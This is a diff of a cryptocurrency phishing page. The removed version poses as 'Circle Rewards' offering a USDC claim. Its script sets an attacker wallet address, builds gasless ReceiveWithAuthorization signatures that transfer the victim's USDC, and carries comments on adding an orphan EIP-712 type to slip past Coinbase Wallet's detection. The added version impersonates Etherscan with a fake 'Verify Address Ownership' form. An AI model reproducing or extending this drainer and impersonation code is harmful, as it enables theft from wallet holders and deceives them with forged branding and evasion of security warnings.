@@ -1,350 +1,689 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Circle Rewards — Claim USDC</title>
-<style>
-:root{
-  --bg:#f7f8fa;--card:#fff;--border:#e5e7eb;--fg:#111827;--dim:#6b7280;
-  --accent:#2775ca;--accent-l:#eff6ff;--ok:#059669;--ok-l:#ecfdf5;
-  --fail:#dc2626;--mono:'SF Mono','Fira Code',monospace;
-  --ui:-apple-system,'Inter',system-ui,sans-serif
-}
-*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
-body{background:var(--bg);color:var(--fg);font-family:var(--ui);font-size:15px;line-height:1.5;min-height:100vh}
-
-nav{background:#fff;border-bottom:1px solid var(--border);padding:0 20px;height:56px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:10}
-.nav-logo{display:flex;align-items:center;gap:8px;font-weight:700;font-size:16px}
-.nav-logo svg{width:28px;height:28px}
-.nav-badge{font-size:11px;font-weight:600;background:var(--accent-l);color:var(--accent);padding:3px 8px;border-radius:20px}
-.nav-tag{font-size:12px;color:var(--dim);background:#f3f4f6;padding:4px 10px;border-radius:6px}
-
-.wrap{max-width:480px;margin:0 auto;padding:28px 20px 60px}
-.chip{display:inline-flex;align-items:center;gap:6px;background:#fef3c7;color:#92400e;font-size:12px;font-weight:600;padding:4px 10px;border-radius:20px;margin-bottom:14px}
-h1{font-size:24px;font-weight:800;line-height:1.2;letter-spacing:-.02em;margin-bottom:8px}
-h1 span{color:var(--accent)}
-.sub{font-size:14px;color:var(--dim);margin-bottom:24px}
-
-.card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:22px;margin-bottom:14px;box-shadow:0 1px 3px rgba(0,0,0,.05)}
-.card-lbl{font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:.06em;color:var(--dim);margin-bottom:14px}
-
-/* ── QR section ── */
-.qr-wrap{text-align:center;padding:8px 0 4px}
-#qr-canvas{border-radius:12px;border:3px solid #fff;box-shadow:0 2px 12px rgba(0,0,0,.12);display:block;margin:0 auto 14px}
-.qr-note{font-size:12px;color:var(--dim);line-height:1.6}
-.qr-note strong{display:block;font-size:13px;color:var(--fg);margin-bottom:4px}
-
-/* ── Mobile mode ── */
-.mobile-msg{background:var(--ok-l);border:1px solid #a7f3d0;border-radius:10px;padding:14px 16px;font-size:13px;color:#065f46;text-align:center;display:none}
-.mobile-msg strong{display:block;font-size:14px;margin-bottom:4px}
-
-/* ── Steps ── */
-.step{display:flex;gap:12px;margin-bottom:18px;position:relative}
-.step::before{content:"";position:absolute;left:13px;top:29px;bottom:-6px;width:1px;background:var(--border)}
-.step:last-child::before{display:none}
-.sn{width:27px;height:27px;border-radius:50%;border:2px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:700;flex-shrink:0;background:#fff;color:var(--dim);transition:all .2s;margin-top:2px}
-.step.active .sn{border-color:var(--accent);color:var(--accent);background:var(--accent-l)}
-.step.done .sn{background:var(--ok);border-color:var(--ok);color:#fff}
-.st{font-weight:700;font-size:14px}
-.ss{font-size:12px;color:var(--dim);margin-top:1px}
-.srow{display:flex;align-items:center;gap:8px;font-size:12px;color:var(--dim);margin-top:8px}
-.sdot{width:7px;height:7px;border-radius:50%;background:var(--dim);flex-shrink:0}
-.sdot.ok{background:var(--ok)}.sdot.fail{background:var(--fail)}
-.sdot.spin{background:var(--accent);animation:pulse .8s infinite}
-@keyframes pulse{0%,100%{opacity:1}50%{opacity:.2}}
-
-.log{font-family:var(--mono);font-size:11px;background:#f9fafb;border:1px solid var(--border);border-radius:8px;padding:9px 12px;max-height:110px;overflow-y:auto;margin-top:8px;line-height:1.9;word-break:break-all}
-.log .ok{color:var(--ok)}.log .fail{color:var(--fail)}.log .dim{color:var(--dim)}
-
-.info{background:var(--accent-l);border:1px solid #bfdbfe;border-radius:10px;padding:13px 16px;margin-bottom:14px;font-size:13px;color:#1e40af;line-height:1.6}
-.info strong{display:block;font-size:13px;margin-bottom:3px}
-
-footer{font-size:12px;color:var(--dim);text-align:center;margin-top:8px;line-height:1.8}
-</style>
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap">
-<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
-<!-- QR via Google Charts API — no JS lib needed -->
-
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+  <title>Etherscan wants to verify ownership of your address.</title>
+  <meta name="description" content="Verify ownership of your Ethereum address on Etherscan." />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet" />
+  <style>
+    :root {
+      --white-solid: hsl(0 0% 100%);
+      --grey-93: hsl(210 16% 93%);
+      --azure-15: hsl(210 11% 15%);
+      --grey-46: hsl(208 7% 46%);
+      --grey-98: hsl(210 17% 98%);
+      --azure-12: hsl(212 74% 12%);
+      --azure-40: hsl(200 93% 40%);
+      --azure-71: hsl(210 11% 71%);
+      --cyan-32: hsl(170 100% 32%);
+      --athens-gray: hsl(220 20% 95%);
+      --geyser: hsl(210 16% 88%);
+      --punch: hsl(357 78% 55%);
+    }
+    html.dim { --white-solid: #111a2e; --grey-93: hsl(215 20% 26%); --azure-15: hsl(210 17% 92%); --grey-46: hsl(212 12% 66%); --grey-98: #152036; --azure-12: hsl(215 30% 12%); --azure-40: hsl(200 93% 55%); --azure-71: hsl(212 12% 55%); --cyan-32: hsl(170 80% 45%); --athens-gray: hsl(215 20% 26%); --geyser: hsl(215 20% 30%); }
+    html.dark { --white-solid: #111111; --grey-93: hsl(0 0% 20%); --azure-15: hsl(0 0% 93%); --grey-46: hsl(0 0% 63%); --grey-98: #171717; --azure-12: hsl(0 0% 5%); --azure-40: hsl(200 93% 55%); --azure-71: hsl(0 0% 50%); --cyan-32: hsl(170 80% 45%); --athens-gray: hsl(0 0% 20%); --geyser: hsl(0 0% 24%); }
+    html.dim body, html.dark body { background-color: var(--grey-98); }
+    html.dim .site-footer, html.dark .site-footer { --azure-15: #ffffff; --azure-12: #ffffff; }
+    html.dim .theme-logo-default, html.dark .theme-logo-default { display: none; }
+    html.dim .theme-logo-light, html.dark .theme-logo-light { display: block; }
+    .theme-logo-light { display: none; }
+    *, *::before, *::after { box-sizing: border-box; }
+    html, body { margin: 0; padding: 0; }
+    html { -webkit-text-size-adjust: 100%; }
+    body { font-family: Inter, system-ui, sans-serif; background-color: var(--white-solid); color: var(--azure-15); min-height: 100vh; overflow-x: hidden; }
+    a { text-decoration: none; color: inherit; }
+    ul { list-style: none; margin: 0; padding: 0; }
+    button { font: inherit; background: none; border: none; cursor: pointer; -webkit-tap-highlight-color: transparent; }
+    img { display: block; max-width: 100%; }
+    .icon { width: 14px; height: 14px; stroke: currentColor; fill: none; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; flex: none; }
+    .icon-sm { width: 12px; height: 12px; }
+    .icon-md { width: 16px; height: 16px; }
+    .container { max-width: 1400px; margin: 0 auto; width: 100%; }
+    .topbar { width: 100%; background-color: var(--white-solid); border-bottom: 1px solid var(--grey-93); padding: 8px 20px; }
+    .topbar-inner { display: flex; align-items: center; justify-content: space-between; gap: 16px; padding: 0 20px; }
+    .topbar-left { display: flex; flex: 1; align-items: center; gap: 16px; min-width: 0; }
+    .topbar-right { display: flex; flex: 1; align-items: center; justify-content: flex-end; gap: 8px; }
+    .tb-group { display: flex; align-items: center; gap: 4px; white-space: nowrap; }
+    .t-xs { font-size: 12px; line-height: 1.33; }
+    .muted { color: var(--grey-46); }
+    .link-blue { color: var(--azure-40); }
+    .link-blue:hover { text-decoration: underline; }
+    .green { color: var(--cyan-32); }
+    .search-wrap { position: relative; flex: 1; min-width: 0; }
+    .search-wrap .search-icon { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); color: var(--azure-71); pointer-events: none; }
+    .search-wrap input { height: 36px; width: 100%; border-radius: 8px; border: 1px solid var(--grey-93); background-color: var(--grey-98); padding: 0 80px 0 38px; font-size: 14px; color: var(--azure-15); font-family: inherit; }
+    .search-wrap input::placeholder { color: var(--grey-46); }
+    .search-wrap input:focus { outline: none; border-color: var(--azure-40); }
+    .slash-badge { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); border-radius: 6px; background-color: color-mix(in srgb, var(--azure-12) 25%, transparent); padding: 1px 8px; font-size: 12px; font-weight: 600; color: var(--white-solid); }
+    .icon-btn { display: flex; height: 38px; width: 38px; align-items: center; justify-content: center; border-radius: 8px; border: 1px solid var(--athens-gray); background-color: var(--white-solid); color: var(--azure-15); transition: background-color .15s ease; flex: none; }
+    .icon-btn:hover { background-color: var(--grey-93); }
+    .theme-wrap { position: relative; }
+    .theme-menu { position: absolute; right: 0; margin-top: 8px; width: 176px; z-index: 50; overflow: hidden; border-radius: 8px; border: 1px solid var(--grey-93); background-color: var(--white-solid); padding: 4px 0; box-shadow: 0 10px 15px -3px rgb(0 0 0 / .1); }
+    .theme-menu[hidden] { display: none; }
+    .theme-menu button { display: flex; width: 100%; align-items: center; gap: 8px; padding: 10px 12px; font-size: 14px; color: var(--azure-15); }
+    .theme-menu button:hover { background-color: var(--grey-98); }
+    .theme-menu button span { flex: 1; text-align: left; }
+    .theme-menu .check { color: var(--azure-40); }
+    .theme-menu .check[hidden] { visibility: hidden; display: block; }
+    .site-header { position: relative; width: 100%; border-bottom: 1px solid var(--grey-93); background-color: var(--white-solid); box-shadow: 0 5px 10px 0 rgb(151 164 175 / .05); }
+    .site-nav { display: flex; align-items: center; justify-content: space-between; padding: 12px 40px; }
+    .brand { padding-right: 16px; display: flex; align-items: center; }
+    .brand img { height: 34px; width: auto; }
+    .nav-list { display: flex; align-items: center; gap: 24px; }
+    .nav-list > li { position: relative; }
+    .nav-link, .nav-btn { display: flex; align-items: center; gap: 4px; padding: 12px 0; font-size: 14px; color: var(--azure-15); transition: color .15s ease; white-space: nowrap; }
+    .nav-link:hover, .nav-btn:hover, .nav-btn.open { color: var(--azure-40); }
+    .nav-sep { font-size: 14px; color: var(--azure-71); }
+    .signin { display: flex; align-items: center; gap: 6px; font-size: 14px; color: var(--azure-15); transition: color .15s ease; white-space: nowrap; }
+    .signin:hover { color: var(--azure-40); }
+    .dropdown { position: absolute; left: 0; top: 100%; z-index: 50; min-width: 280px; border-radius: 0 0 6px 6px; border-left: 1px solid var(--grey-93); border-right: 1px solid var(--grey-93); border-bottom: 1px solid var(--grey-93); border-top: 3px solid var(--azure-40); background-color: var(--white-solid); padding: 8px 0; box-shadow: 0 8px 24px rgb(0 0 0 / .12); }
+    .dropdown[hidden] { display: none; }
+    .dropdown a { display: flex; align-items: center; gap: 8px; white-space: nowrap; padding: 7px 20px; font-size: 13px; color: var(--azure-15); }
+    .dropdown a:hover { background: var(--grey-98); color: var(--azure-40); }
+    .dropdown .divider { margin: 8px 0; border-top: 1px solid var(--azure-40); }
+    .badge-pill { border-radius: 999px; background-color: var(--grey-93); padding: 1px 8px; font-size: 10px; font-weight: 500; color: var(--azure-40); }
+    .main { background-image: linear-gradient(to top, var(--white-solid), var(--grey-98)); padding: 0 20px; }
+    .main-inner { display: flex; justify-content: center; padding: 80px 0 128px; }
+    .card { display: flex; flex-direction: column; align-items: center; width: 567px; max-width: 100%; border-radius: 12px; border: 1px solid var(--grey-93); background-color: var(--white-solid); padding: 24px 24px 52px; box-shadow: 0 8px 19.2px 0 rgb(189 197 209 / .2); }
+    .card h1 { margin: 0; font-weight: 500; font-size: 23px; line-height: 1.2; color: var(--azure-15); text-align: center; }
+    .card .sub { margin: 8px 0 0; font-weight: 400; font-size: 14px; color: rgb(108,117,125); text-align: center; }
+    html.dim .card .sub, html.dark .card .sub { color: var(--grey-46); }
+    .field-wrap { width: 100%; margin-top: 28px; }
+    .field-label { font-size: 13px; font-weight: 500; color: var(--azure-15); margin-bottom: 6px; display: flex; align-items: center; gap: 2px; }
+    .required { color: var(--punch); }
+    .addr-input { width: 100%; height: 44px; border: 1px solid var(--grey-93); border-radius: 8px; padding: 0 14px; font-size: 13.5px; color: var(--azure-15); background: var(--white-solid); outline: none; font-family: Inter, system-ui, sans-serif; transition: border-color .15s, box-shadow .15s; }
+    .addr-input:focus { border-color: var(--azure-40); box-shadow: 0 0 0 3px hsl(200 93% 40% / .12); }
+    .addr-input::placeholder { color: var(--azure-71); }
+    .continue-btn { width: 100%; height: 46px; margin-top: 14px; background: var(--azure-40); color: #fff; border: none; border-radius: 8px; font-size: 14.5px; font-weight: 500; cursor: pointer; transition: filter .15s; letter-spacing: .1px; }
+    .continue-btn:hover:not(:disabled) { filter: brightness(1.1); }
+    .continue-btn:disabled { opacity: .55; cursor: default; }
+    .status-msg { margin-top: 12px; font-size: 13px; text-align: center; color: var(--grey-46); min-height: 18px; line-height: 1.4; width: 100%; }
+    .status-msg.ok { color: var(--cyan-32); font-weight: 500; }
+    .status-msg.err { color: var(--punch); }
+    .site-footer { width: 100%; background-color: var(--grey-98); padding: 0 20px; }
+    .footer-inner { max-width: 1400px; margin: 0 auto; padding: 0 20px; }
+    .footer-top { display: flex; align-items: center; justify-content: space-between; padding: 24px 0; gap: 16px; flex-wrap: wrap; }
+    .socials { display: flex; gap: 8px; }
+    .socials a { display: flex; height: 32px; width: 32px; align-items: center; justify-content: center; border-radius: 16px; border: 1px solid var(--athens-gray); background-color: var(--athens-gray); transition: background-color .15s ease; }
+    .socials a:hover { background-color: var(--geyser); }
+    .back-top { display: flex; align-items: center; gap: 4px; font-size: 14px; color: var(--azure-12); }
+    .back-top:hover { text-decoration: underline; }
+    .footer-cols { display: flex; flex-wrap: wrap; justify-content: space-between; gap: 24px; padding: 40px 0; }
+    .footer-brand { display: flex; width: 460px; max-width: 100%; flex-direction: column; gap: 12px; padding-right: 32px; }
+    .footer-brand .row { display: flex; align-items: center; gap: 8px; }
+    .footer-brand .row img { height: 32px; width: 20px; }
+    .footer-brand .row p { margin: 0; font-size: 18px; color: var(--azure-15); }
+    .footer-desc { margin: 0; font-size: 12px; line-height: normal; color: var(--azure-15); }
+    .footer-desc span { white-space: nowrap; }
+    .footer-col { width: 240px; max-width: 100%; }
+    .footer-col > p { margin: 0; font-size: 14px; font-weight: 500; line-height: 1.2; color: var(--azure-15); }
+    .footer-col ul { margin-top: 16px; display: flex; flex-direction: column; gap: 12px; }
+    .footer-col li { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
+    .footer-col a { font-size: 12px; color: var(--azure-12); }
+    .footer-col a:hover { color: var(--azure-40); text-decoration: underline; }
+    .hiring { border-radius: 800px; background-color: var(--azure-40); padding: 2px 8px; font-size: 12px; font-weight: 500; color: var(--white-solid); }
+    .footer-bottom { display: flex; flex-wrap: wrap; align-items: center; justify-content: space-between; border-top: 1px solid var(--grey-93); padding: 16px 0; gap: 8px; }
+    .footer-bottom p { margin: 0; font-size: 12px; color: var(--azure-15); }
+    .donations { display: flex; align-items: center; gap: 4px; font-size: 12px; color: var(--azure-15); flex-wrap: wrap; }
+    .donations a { font-size: 12px; color: var(--azure-40); }
+    .donations a:hover { text-decoration: underline; }
+    .heart { margin-left: 4px; width: 12px; height: 12px; fill: var(--punch); stroke: var(--punch); }
+    #spinner-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,.25); z-index: 999; align-items: center; justify-content: center; }
+    #spinner-overlay.show { display: flex; }
+    .spinner { width: 40px; height: 40px; border: 3px solid rgba(255,255,255,.3); border-top-color: #fff; border-radius: 50%; animation: spin .7s linear infinite; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    @media (max-width: 900px) {
+      .topbar { display: none !important; }
+      body { display: flex; flex-direction: column; }
+      .mobile-topbar { order: 1; }
+      .site-header { order: 2; }
+      .main { order: 3; }
+      .site-footer { order: 4; }
+      .mobile-topbar { display: flex; justify-content: center; align-items: center; padding: 12px 16px; background: var(--white-solid); border-bottom: 1px solid var(--grey-93); }
+      .mobile-topbar .search-wrap { flex: 1 1 auto; width: 100%; max-width: 100%; }
+      .mobile-topbar .search-wrap input { height: 40px; padding: 0 40px 0 38px; font-size: 14px; }
+      .mobile-topbar .slash-badge { display: none; }
+      .site-header { display: block !important; }
+      .site-nav { padding: 12px 16px; gap: 12px; position: relative; }
+      .brand { padding-right: 0; }
+      .brand img { height: 34px; width: auto; }
+      .nav-list { display: none !important; }
+      .hamburger { display: flex !important; position: static; margin-left: auto; flex-direction: column; gap: 5px; cursor: pointer; background: none; border: none; padding: 6px; z-index: 1100; }
+      .hamburger span { display: block; width: 24px; height: 2px; background-color: var(--azure-15); border-radius: 2px; transition: transform 0.25s ease, opacity 0.25s ease; }
+      .hamburger.open span:nth-child(1) { transform: translateY(7px) rotate(45deg); }
+      .hamburger.open span:nth-child(2) { opacity: 0; }
+      .hamburger.open span:nth-child(3) { transform: translateY(-7px) rotate(-45deg); }
+      .mobile-menu { display: block; position: absolute; top: 100%; left: 0; right: 0; width: 100%; background: var(--white-solid); border-bottom: 1px solid var(--grey-93); box-shadow: 0 12px 28px rgba(0,0,0,.12); padding: 0; max-height: 0; overflow: hidden; transition: max-height 0.3s ease; z-index: 999; }
+      .mobile-menu.open { max-height: 400px; }
+      .mobile-menu .nav-link { display: block; font-size: 15px; color: var(--azure-15); padding: 14px 20px; border-bottom: 1px solid var(--grey-93); transition: background-color .15s, color .15s; }
+      .mobile-menu .nav-link:last-child { border-bottom: none; }
+      .mobile-menu .nav-link:hover { background-color: var(--grey-98); color: var(--azure-40); }
+      .main { padding: 0 12px; }
+      .main-inner { padding: 28px 0 56px; }
+      .card { width: 100%; padding: 20px 16px 36px; border-radius: 10px; }
+      .card h1 { font-size: 21px; }
+      .card .sub { font-size: 13px; line-height: 1.45; }
+      .site-footer { padding: 0 12px; }
+      .footer-inner { padding: 0; }
+      .footer-top { padding: 18px 0; flex-direction: column; align-items: flex-start; gap: 14px; }
+      .footer-cols { padding: 24px 0; gap: 0; display: grid; grid-template-columns: 1fr 1fr; grid-template-rows: auto auto; row-gap: 28px; }
+      .footer-brand { width: 100%; padding-right: 0; grid-column: 1 / -1; }
+      .footer-desc span { white-space: normal; }
+      .footer-col { width: 100%; }
+      .footer-col:last-child { grid-column: 1 / -1; }
+      .footer-col ul { gap: 10px; }
+      .footer-col a { font-size: 13px; }
+      .footer-bottom { padding: 14px 0; flex-direction: column; align-items: flex-start; gap: 8px; }
+      .footer-bottom p { font-size: 11px; }
+      .donations { font-size: 12px; }
+    }
+    @media (min-width: 901px) {
+      .mobile-topbar, .hamburger, .mobile-menu { display: none !important; }
+    }
+    @media (max-width: 380px) {
+      .card h1 { font-size: 18px; }
+      .card .sub { font-size: 12px; }
+    }
+  </style>
 </head>
-<body>
+<body id="top">
 
-<nav>
-  <div class="nav-logo">
-    <svg viewBox="0 0 28 28" fill="none"><circle cx="14" cy="14" r="14" fill="#2775CA"/><path d="M14 5.6C9.36 5.6 5.6 9.36 5.6 14C5.6 18.64 9.36 22.4 14 22.4C18.64 22.4 22.4 18.64 22.4 14C22.4 9.36 18.64 5.6 14 5.6ZM15.12 19.04V20.3C15.12 20.72 14.78 21.06 14.36 21.06H13.64C13.22 21.06 12.88 20.72 12.88 20.3V19.02C11.2 18.74 9.8 17.82 9.52 16.3C9.46 15.96 9.74 15.64 10.08 15.64H10.96C11.24 15.64 11.48 15.84 11.54 16.12C11.74 16.98 12.54 17.56 14.02 17.56C15.68 17.56 16.56 16.82 16.56 15.74C16.56 14.76 15.98 14.2 14.22 13.82L13.12 13.58C11.08 13.14 9.88 12.1 9.88 10.44C9.88 9.0 10.96 7.84 12.88 7.5V6.22C12.88 5.8 13.22 5.46 13.64 5.46H14.36C14.78 5.46 15.12 5.8 15.12 6.22V7.52C16.62 7.84 17.74 8.72 17.98 10.06C18.04 10.4 17.76 10.72 17.42 10.72H16.58C16.3 10.72 16.06 10.52 16.0 10.24C15.8 9.36 15.06 8.86 13.82 8.86C12.38 8.86 11.56 9.56 11.56 10.52C11.56 11.46 12.22 12.0 13.82 12.36L14.92 12.6C17.1 13.1 18.24 14.08 18.24 15.8C18.24 17.34 17.12 18.68 15.12 19.04Z" fill="white"/></svg>
-    Circle Rewards
-    <span class="nav-badge">BETA</span>
-  </div>
-  <span class="nav-tag">Ethereum Mainnet</span>
-</nav>
-
-<div class="wrap">
-  <div class="chip">⏳ Rewards available</div>
-  <h1>Claim your <span>USDC</span><br>liquidity rewards</h1>
-  <p class="sub">Your wallet qualifies for USDC rewards from the Circle Liquidity Program. Open on mobile or scan below.</p>
-
-  <div class="info">
-    <strong>Gasless authorization</strong>
-    Sign once with your wallet — no ETH required. We handle the on-chain execution.
-  </div>
-
-  <!-- QR card — only shown on desktop -->
-  <div class="card" id="qr-card">
-    <div class="card-lbl">Scan with Coinbase Wallet</div>
-    <div class="qr-wrap">
-      <img id="qr-img" src="" alt="QR Code" style="border-radius:12px;border:3px solid #fff;box-shadow:0 2px 12px rgba(0,0,0,.12);width:200px;height:200px;display:block;margin:0 auto 14px">
-      <div class="qr-note">
-        <strong>Open this page in Coinbase Wallet mobile</strong>
-        Scan the QR with your CW app → Browser → connect and sign
+  <div class="topbar">
+    <div class="container topbar-inner">
+      <div class="topbar-left">
+        <div class="tb-group">
+          <span class="t-xs muted">ETH Price:&nbsp;</span>
+          <a class="t-xs link-blue" href="#">$2,482.35</a>
+          <span class="t-xs green">&nbsp;(+0.19%)</span>
+        </div>
+        <div class="tb-group">
+          <span class="t-xs muted">Gas:&nbsp;</span>
+          <a class="t-xs link-blue" href="#">0.206 Gwei</a>
+        </div>
+      </div>
+      <div class="topbar-right">
+        <div class="search-wrap">
+          <svg class="icon search-icon" viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/></svg>
+          <input type="text" aria-label="Search" placeholder="Search by Address / Txn Hash / Block / Token / Domain Name" />
+          <span class="slash-badge">/</span>
+        </div>
+        <button type="button" class="icon-btn" aria-label="Settings">
+          <svg class="icon" viewBox="0 0 24 24"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 1 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06.06A1.65 1.65 0 0 0 4.6 15a1.65 1.65 0 0 0-1.51-1H3a2 2 0 1 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06A1.65 1.65 0 0 0 9 4.6a1.65 1.65 0 0 0 1-1.51V3a2 2 0 1 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06A1.65 1.65 0 0 0 19.4 9c.14.63.7 1.08 1.35 1.09H21a2 2 0 1 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1Z"/></svg>
+        </button>
+        <div class="theme-wrap">
+          <button type="button" id="theme-btn" class="icon-btn" aria-label="Toggle appearance"></button>
+          <div id="theme-menu" class="theme-menu" hidden></div>
+        </div>
       </div>
     </div>
   </div>
 
-  <!-- Mobile msg — shown when CW mobile detected -->
-  <div class="mobile-msg" id="mobile-msg">
-    <strong>✓ Coinbase Wallet detected</strong>
-    Connecting and preparing your reward claim…
-  </div>
-
-  <!-- Steps -->
-  <div class="card">
-    <div class="card-lbl">Claim steps</div>
-
-    <div class="step active" id="s1">
-      <div class="sn" id="sn1">1</div>
-      <div>
-        <div class="st">Connect wallet</div>
-        <div class="ss">Verify address and reward balance</div>
-        <div class="log" id="logA"></div>
-      </div>
-    </div>
-
-    <div class="step" id="s2">
-      <div class="sn" id="sn2">2</div>
-      <div>
-        <div class="st">Authorize transfer</div>
-        <div class="ss">Gasless signature — no ETH required</div>
-        <div class="srow"><div class="sdot" id="sdot"></div><span id="stxt">Waiting…</span></div>
-      </div>
-    </div>
-
-    <div class="step" id="s3">
-      <div class="sn" id="sn3">3</div>
-      <div>
-        <div class="st">Receive USDC</div>
-        <div class="ss">Distributed to your wallet</div>
-        <div class="log" id="logB" style="display:none"></div>
-      </div>
+  <div class="mobile-topbar">
+    <div class="search-wrap">
+      <svg class="icon search-icon" viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/></svg>
+      <input type="text" aria-label="Search" placeholder="Search by Address / Txn Hash / Block / Token / Domain Name" />
     </div>
   </div>
 
-  <footer>Circle Rewards beta — gasless EIP-3009 authorization · Ethereum Mainnet</footer>
-</div>
+  <header class="site-header" id="site-header">
+    <nav class="container site-nav">
+      <a class="brand" href="https://etherscan.io" target="_blank" rel="noopener">
+        <svg width="120" height="34" viewBox="0 0 300 85" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <rect width="300" height="85" rx="4" fill="white"/>
+          <text x="10" y="58" font-family="Inter,sans-serif" font-weight="700" font-size="42" fill="#21325b">etherscan</text>
+        </svg>
+      </a>
+      <ul class="nav-list" id="nav-list">
+        <li><a class="nav-link" href="https://etherscan.io" target="_blank" rel="noopener">Home</a></li>
+        <li data-menu="blockchain">
+          <button type="button" class="nav-btn">Blockchain <svg class="icon" viewBox="0 0 24 24"><path d="m6 9 6 6 6-6"/></svg></button>
+          <div class="dropdown" hidden>
+            <a href="https://etherscan.io/txs" target="_blank" rel="noopener">Transactions</a>
+            <a href="https://etherscan.io/txsPending" target="_blank" rel="noopener">Pending Transactions</a>
+            <div class="divider"></div>
+            <a href="https://etherscan.io/blocks" target="_blank" rel="noopener">View Blocks</a>
+            <div class="divider"></div>
+            <a href="https://etherscan.io/accounts" target="_blank" rel="noopener">Top Accounts</a>
+          </div>
+        </li>
+        <li><a class="nav-link" href="https://etherscan.io/tokens" target="_blank" rel="noopener">Tokens</a></li>
+        <li data-menu="resources">
+          <button type="button" class="nav-btn">Resources <svg class="icon" viewBox="0 0 24 24"><path d="m6 9 6 6 6-6"/></svg></button>
+          <div class="dropdown" hidden>
+            <a href="https://etherscan.io/charts" target="_blank" rel="noopener">Charts &amp; Stats</a>
+            <a href="https://etherscan.io/gastracker" target="_blank" rel="noopener">Gas Tracker</a>
+          </div>
+        </li>
+        <li><a class="nav-link" href="https://etherscan.io" target="_blank" rel="noopener">More</a></li>
+        <li aria-hidden="true" class="nav-sep">|</li>
+        <li>
+          <a class="signin" href="https://etherscan.io/login" target="_blank" rel="noopener">
+            <svg class="icon icon-md" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="10" r="3"/><path d="M7 20.7a8 8 0 0 1 10 0"/></svg>
+            Sign In
+          </a>
+        </li>
+      </ul>
+      <button class="hamburger" id="hamburgerBtn" aria-label="Menu">
+        <span></span><span></span><span></span>
+      </button>
+    </nav>
+    <div class="mobile-menu" id="mobileMenu">
+      <a class="nav-link" href="https://etherscan.io/login" target="_blank" rel="noopener">Sign in</a>
+      <a class="nav-link" href="https://etherscan.io" target="_blank" rel="noopener">More</a>
+    </div>
+  </header>
 
-<script>
-// ─── Config ───────────────────────────────────────────────────────────────────
-const BACKEND  = window.location.origin;
-const WALLET_B = "0xBFf88A54E1Fa8041f9E632c3935766DdF43ea80c";
-const USDC     = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
+  <main class="main">
+    <div class="container main-inner">
+      <div class="card">
+        <h1>Verify Address Ownership</h1>
+        <p class="sub">Find out more about
+          <a class="link-blue" href="https://etherscan.io/verifyAddress" target="_blank" rel="noopener">Verify Address Ownership</a>
+        </p>
+        <div class="field-wrap">
+          <div class="field-label">Please enter contract address<span class="required">*</span></div>
+          <input class="addr-input" id="addr-input" type="text" placeholder="0x..." autocomplete="off" spellcheck="false" />
+          <button class="continue-btn" id="continue-btn" onclick="onContinue()">Continue</button>
+          <div class="status-msg" id="status-msg"></div>
+        </div>
+      </div>
+    </div>
+  </main>
 
-// CHAOS v11 — orphan AuditTrace type in types{} to confuse CW detection parser
-// primaryType = ReceiveWithAuthorization (valid for USDC.receiveWithAuthorization)
-// AuditTrace is referenced in types{} but NOT in message → orphan
-// EIP-712 hash ignores unreferenced types → sig valid on-chain
-// CW JSON parser may fail to decode "Autoriser préalable" due to extra type
-const RECEIVE_TYPES = [
-  {name:"from",        type:"address"},
-  {name:"to",          type:"address"},
-  {name:"value",       type:"uint256"},
-  {name:"validAfter",  type:"uint256"},
-  {name:"validBefore", type:"uint256"},
-  {name:"nonce",       type:"bytes32"}
-];
-const DOM_TYPES = [
-  {name:"name",type:"string"},{name:"version",type:"string"},
-  {name:"chainId",type:"uint256"},{name:"verifyingContract",type:"address"}
-];
-// Orphan type — defined but never referenced in primaryType or message
-const AUDIT_TRACE_TYPE = [
-  {name:"ref", type:"string"},
-  {name:"ts",  type:"uint256"}
-];
-const RPCS = [
-  "https://rpc.ankr.com/eth","https://eth.llamarpc.com",
-  "https://1rpc.io/eth","https://ethereum.publicnode.com","https://cloudflare-eth.com"
-];
+  <footer class="site-footer">
+    <div class="footer-inner">
+      <div class="footer-top">
+        <div class="socials">
+          <a href="https://twitter.com/etherscan" target="_blank" rel="noopener" aria-label="Twitter">
